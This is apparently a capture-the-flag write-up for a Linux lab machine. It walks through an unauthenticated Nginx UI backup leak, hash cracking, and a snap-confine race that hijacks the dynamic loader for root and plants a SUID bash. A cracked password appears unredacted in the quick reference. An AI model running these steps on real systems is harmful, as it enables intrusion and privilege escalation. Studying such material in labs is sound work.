# Snapped

**OS:** Linux | **Difficulty:** Hard | **IP:** `10.129.xx.xx`

## Overview
Snapped is a hard Linux machine featuring two recent CVEs. The foothold exploits CVE-2026-27944 in Nginx-UI, which exposes the `/api/backup` endpoint without authentication and leaks the decryption key in the response headers. Extracting the backup reveals a database with bcrypt password hashes — cracking one gives SSH access. Privilege escalation exploits CVE-2026-3888, a TOCTOU race condition between snap-confine's mimic creation and systemd-tmpfiles cleanup. Winning the race poisons the sandbox's shared libraries, enabling dynamic linker hijacking on the SUID-root snap-confine binary for full root access.

## Enumeration

### Port Scanning

**Command:**
```bash
nmap -sC -sV -p- 10.129.xx.xx -oN scans/full_tcp.txt --min-rate 3000
```

**Key results:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22   | SSH     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 | Standard config |
| 80   | HTTP    | nginx 1.24.0 (Ubuntu) | Redirects to http://snapped.htb/ |

Only two ports open — a tight attack surface. The redirect to `snapped.htb` tells us we need to add it to `/etc/hosts`.

```bash
echo "10.129.xx.xx snapped.htb" | sudo tee -a /etc/hosts
```

### Service Enumeration

**Web (port 80):**

Visiting `snapped.htb` shows a static marketing site for "APAC Infrastructure Platform" — a company called Snapped. No forms, no dynamic content, nothing exploitable. Time to look for other subdomains or directories.

```bash
ffuf -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt -u http://FUZZ.snapped.htb -ic
```

This finds `admin.snapped.htb` returning a 200 with different content. Adding it to `/etc/hosts` and visiting it reveals the login page for **Nginx UI**, a web-based management interface for nginx.

The Nginx UI version can be identified from JavaScript bundles loaded on the login page — it's **v2.3.2**.

**API enumeration on admin.snapped.htb:**

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://admin.snapped.htb/api/FUZZ -ic
```

Results:
- `/api/backup` — **200 OK**, 18306 bytes (interesting!)
- `/api/settings` — 403 Forbidden
- `/api/licenses` — 200 OK, small response

### What Stood Out

The `/api/backup` endpoint returning a 200 without any authentication is suspicious. Combined with the known Nginx UI version (2.3.2), this points directly at **CVE-2026-27944** — an unauthenticated backup exfiltration vulnerability. The backup contains the full nginx and nginx-ui configuration, including the database with user credentials.

## Foothold

### The Vulnerability

**CVE-2026-27944** — Nginx UI versions <= 2.3.2 expose the `/api/backup` endpoint without authentication. The endpoint returns an encrypted ZIP backup of all nginx and nginx-ui configuration files, and the `X-Backup-Security` response header contains the AES-256-CBC key and IV needed to decrypt it. This is like handing someone a locked safe along with the key taped to the outside.

### Exploitation — Step by Step

**Step 1: Download the backup and capture the decryption key**

```bash
curl -v http://admin.snapped.htb/api/backup -o backup.zip 2>&1 | grep X-Backup-Security
```

The response includes:
```
X-Backup-Security: Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=:Jky/YqOISOX3gcTE9lj7zQ==
```

The header format is `base64(key):base64(iv)`. Decode both parts:

```bash
key=$(echo 'Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=' | base64 -d | xxd -p -c 256)
iv=$(echo 'Jky/YqOISOX3gcTE9lj7zQ==' | base64 -d | xxd -p -c 256)
```

**Step 2: Extract and decrypt the backup**

```bash
unzip -d backup backup.zip
# Contains: hash_info.txt, nginx-ui.zip (encrypted), nginx.zip (encrypted)

openssl enc -aes-256-cbc -d -in backup/nginx-ui.zip -out nginxui_decrypted.zip -K $key -iv $iv
unzip nginxui_decrypted.zip
# Contains: app.ini, database.db
```

**Step 3: Extract credentials from the database**

```bash
sqlite3 database.db "SELECT * FROM users;"
```

This reveals two users with bcrypt hashes:

| User | Hash |
|------|------|
| admin | **`REDACTED`** |
| jonathan | **`REDACTED`** |

**Step 4: Crack the hashes**

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

The admin hash doesn't crack, but jonathan's does: **`REDACTED`**

**Step 5: SSH as jonathan**

```bash
ssh jonathan@snapped.htb
# Password: REDACTED
```

```bash
jonathan@snapped:~$ id
uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
jonathan@snapped:~$ cat ~/user.txt
```

### Flag
```bash
cat /home/jonathan/user.txt
```
`<redacted>`

## Privilege Escalation (Root)

### Situation

We're logged in as `jonathan`, a standard user with no sudo privileges and no unusual group memberships. Time to enumerate for privilege escalation vectors.

### Discovery

Checking for snap:

```bash
snap --version
```
```
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic
```

snapd 2.63.1 is vulnerable to **CVE-2026-3888** — a TOCTOU race condition in snap-confine that allows local privilege escalation. The vulnerability was patched in snapd 2.74.2.

Two key configuration details make exploitation reliable:

```bash
systemctl cat systemd-tmpfiles-clean.timer
```
```
# /etc/systemd/system/systemd-tmpfiles-clean.timer.d/override.conf
[Timer]
OnBootSec=1m
OnUnitActiveSec=1m
```

```bash
cat /usr/lib/tmpfiles.d/tmp.conf
```
```
D /tmp 1777 root root 4m
```

The cleanup timer runs every **1 minute** (overridden from the default 1 day), and files in `/tmp` older than **4 minutes** are deleted. This creates the perfect conditions for the race — the `.snap` directory under `/tmp` will be cleaned up regularly, forcing snap-confine to recreate it.

### The Vulnerability — CVE-2026-3888

snap-confine is a SUID-root binary that sets up the sandbox for snap applications. Part of this setup involves creating "mimics" — writable copies of read-only filesystem directories. For `/usr/lib/x86_64-linux-gnu`, the mimic sequence is:

```
1. mount --bind /usr/lib/x86_64-linux-gnu → /tmp/.snap/usr/lib/x86_64-linux-gnu
2. mount -t tmpfs → /usr/lib/x86_64-linux-gnu
3. for each entry in /tmp/.snap/usr/lib/x86_64-linux-gnu:
       mount --bind entry → /usr/lib/x86_64-linux-gnu/entry
4. umount /tmp/.snap/usr/lib/x86_64-linux-gnu
```

Between steps 1 and 3, the contents of `/tmp/.snap/usr/lib/x86_64-linux-gnu` can be swapped by an attacker. Step 3 then bind-mounts attacker-owned files into the namespace as root. This is a classic TOCTOU (time-of-check-to-time-of-use) race condition.

The exploit uses AF_UNIX sockets with 1-byte buffers to create extreme backpressure on snap-confine's stderr, effectively single-stepping its execution. When the trigger message (step 1 of the mimic) is detected, the attacker has unlimited time to perform the swap via `renameat2(RENAME_EXCHANGE)`.

### Exploitation

This exploit requires coordination across multiple steps. Two C programs are needed:

- **firefox_2404.c** — Race helper. Creates the `.snap` mimic tree with attacker-owned copies of ~285 real libraries, launches snap-confine through a throttled socket, detects the bind-mount trigger, and atomically swaps directories.
- **librootshell.c** — Minimal shellcode ELF. Replaces `ld-linux-x86-64.so.2`. Calls `setreuid(0,0)`, `setregid(0,0)`, `execve("/tmp/sh")`.

Compile on the attacker machine and upload:

```bash
gcc -O2 -static -o firefox_2404 firefox_2404.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
scp firefox_2404 librootshell.so jonathan@snapped.htb:~/
```

**Step 1 — Enter the Firefox snap sandbox**

```bash
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 \
  snap.firefox.hook.configure /bin/sh -c \
  'cd /tmp; while test -d ./.snap; do touch ./; sleep 1; done; sleep 99999'
```

This enters the Firefox snap's sandbox and keeps the mount namespace alive. The `touch ./` command keeps `/tmp` fresh (preventing its deletion) while `.snap` ages past the 4-minute threshold. Note the PID of the inner shell process.

**Step 2 — Wait for .snap deletion (~4-5 minutes)**

The `while test -d ./.snap` loop exits when systemd-tmpfiles cleans `.snap`. The process continues to `sleep 99999`, keeping the mount namespace alive.

**Step 3 — Access sandbox /tmp from outside**

From a second terminal:

```bash
cd /proc/<SANDBOX_PID>/cwd
ls -la
```

`/proc/PID/cwd` follows the process's mount namespace view, bypassing the `700 root:root` permissions on `/tmp/snap-private-tmp/`.

**Step 4 — Destroy the cached mount namespace**

```bash
systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash -c \
  'env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd \
   snap.firefox.hook.configure /nonexistent'
```

Using `--base snapd` (an invalid base) tears down the cached mount namespace while preserving `/tmp`. The error is expected — the failure itself is what destroys the namespace. The `systemd-run` wrapper satisfies snap's cgroup requirement.

**Step 5 — Win the race**

From the `/proc/<PID>/cwd` directory:

```bash
~/firefox_2404 ~/librootshell.so
```

Output:
```
[*] CVE-2026-3888 -- firefox 24.04 helper
[*] Setting up .snap and .exchange directory...
[*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
[*] Starting race against snap-confine...
[*] Reading snap-confine output (PID 40778)...

[!] TRIGGER DETECTED! Swapping .exchange...
[+] SWAP DONE! Race won.
[*] Do NOT close this terminal.
```

The helper recreates `.snap` (attacker-owned), copies 285 real libraries into `.exchange`, launches snap-confine with `SNAPD_DEBUG=1` through a tiny socket, and detects the bind-mount trigger. At that point, it atomically swaps the directories via `renameat2(RENAME_EXCHANGE)`. snap-confine resumes and bind-mounts our attacker-owned files into the namespace as root.

**Step 6 — Overwrite the dynamic loader**

The inner snap-confine process writes its PID to `/tmp/race_pid.txt` and `race_perms.txt` confirms attacker ownership:

```bash
PID=$(cat /proc/<SANDBOX_PID>/cwd/race_pid.txt)
cat /proc/<SANDBOX_PID>/cwd/race_perms.txt
# jonathan:jonathan 755
```

Navigate into the poisoned namespace and overwrite `ld-linux`:

```bash
cd /proc/$PID/root
stat -c '%U:%G' usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
# jonathan:jonathan

cp /usr/bin/busybox ./tmp/sh
cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

busybox is placed as `/tmp/sh` because it's statically linked (no ld-linux dependency). The shellcode in `librootshell.so` calls `setreuid(0,0)`, `setregid(0,0)`, then `execve("/tmp/sh")`.

**Step 7 — Trigger root**

```bash
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 \
  snap.firefox.hook.configure /usr/lib/snapd/snap-confine
```

snap-confine is SUID-root and dynamically linked. The kernel reads `PT_INTERP`, maps our poisoned `ld-linux-x86-64.so.2` as the dynamic loader, and executes it with euid=0. Our shellcode runs `setreuid(0,0)` then `execve("/tmp/sh")`, giving us a root BusyBox shell:

```
BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3.1) built-in shell (ash)
/ # id
uid=0(root) gid=1000(jonathan) groups=1000(jonathan)
```

**Step 8 — Escape the sandbox**

From the BusyBox root shell:

```bash
cp /bin/bash /var/snap/firefox/common/bash
chmod 04755 /var/snap/firefox/common/bash
exit
```

Firefox's AppArmor profile allows writing to `/var/snap/firefox/common/`. The SUID bash persists outside the sandbox with no AppArmor confinement.

**Step 9 — Full root**

```bash
/var/snap/firefox/common/bash -p
bash-5.1# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
bash-5.1# cat /root/root.txt
```

### Flag
```bash
cat /root/root.txt
```
`<redacted>`

## Key Takeaways
- **CVE-2026-27944 (Nginx-UI)** is a textbook example of defense-in-depth failure: the backup endpoint has no authentication AND the encryption key is leaked in the response headers. Either flaw alone would be less severe, but together they give full credential access.
- **CVE-2026-3888 (snap-confine)** is a sophisticated TOCTOU race condition that requires understanding of Linux mount namespaces, SUID binary behavior, dynamic linking, and AppArmor profiles. The AF_UNIX socket backpressure technique to single-step the race target is elegant — it turns an unreliable race into a deterministic exploit.
- The machine's modified systemd-tmpfiles timer (1-minute interval instead of 1 day) is what makes the exploit practical in a CTF timeframe. In real-world scenarios, the attacker would need to wait much longer or find another way to trigger `.snap` cleanup.
- The sandbox escape via `/var/snap/firefox/common/` highlights that AppArmor write permissions in snap profiles can have security implications beyond the sandbox boundary.

## Commands Quick Reference

```bash
# Recon
nmap -sC -sV -p- 10.129.11.119
ffuf -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt -u http://FUZZ.snapped.htb -ic
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://admin.snapped.htb/api/FUZZ -ic

# Foothold — CVE-2026-27944
curl -v http://admin.snapped.htb/api/backup -o backup.zip
# Extract key:IV from X-Backup-Security header, decrypt with openssl
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
ssh jonathan@snapped.htb  # linkinpark

# Root — CVE-2026-3888
# Terminal 1: Enter sandbox
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/sh -c 'cd /tmp; while test -d ./.snap; do touch ./; sleep 1; done; sleep 99999'
# Terminal 2: Wait for .snap deletion, destroy namespace, run race
cd /proc/<PID>/cwd
systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash -c 'env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd snap.firefox.hook.configure /nonexistent'
~/firefox_2404 ~/librootshell.so
# Terminal 3: Overwrite ld-linux, trigger root, escape
cd /proc/$(cat /proc/<PID>/cwd/race_pid.txt)/root
cp /usr/bin/busybox ./tmp/sh
cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
# In BusyBox: cp /bin/bash /var/snap/firefox/common/bash && chmod 04755 /var/snap/firefox/common/bash
/var/snap/firefox/common/bash -p
```
